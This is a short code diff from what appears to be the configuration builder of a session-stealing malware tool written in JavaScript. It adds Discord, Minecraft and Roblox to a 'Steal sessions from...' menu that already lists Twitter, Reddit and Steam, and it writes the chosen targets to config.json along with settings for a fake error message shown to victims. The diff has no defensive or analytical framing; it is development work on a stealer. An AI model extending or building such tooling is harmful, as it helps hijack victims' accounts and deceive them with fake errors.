@@ -119,9 +119,12 @@ console.log('');
         type: 'checkbox',
         message: 'Steal sessions from...',
         choices: [
+          { name: 'Discord', value: 'discord', checked: config.sessionStealing.discord },
           { name: 'Twitter', value: 'twitter', checked: config.sessionStealing.twitter },
           { name: 'Reddit', value: 'reddit', checked: config.sessionStealing.reddit },
           { name: 'Steam', value: 'steam', checked: config.sessionStealing.steam },
+          { name: 'Minecraft', value: 'minecraft', checked: config.sessionStealing.minecraft },
+          { name: 'Roblox', value: 'roblox', checked: config.sessionStealing.roblox },
         ]
       },
       {
@@ -168,6 +171,7 @@ console.log('');
   config.fakeError = answers.options__fake_error;
   config.fakeErrorDetails.title = answers.options__fake_error_title || config.fakeErrorDetails.title;
   config.fakeErrorDetails.message = answers.options__fake_error_message || config.fakeErrorDetails.message;
+  config.sessionStealing = {};
   answers.options__session_stealing.forEach(i => config.sessionStealing[i] = true);
   writeFileSync('./config.json', JSON.stringify(config));
 
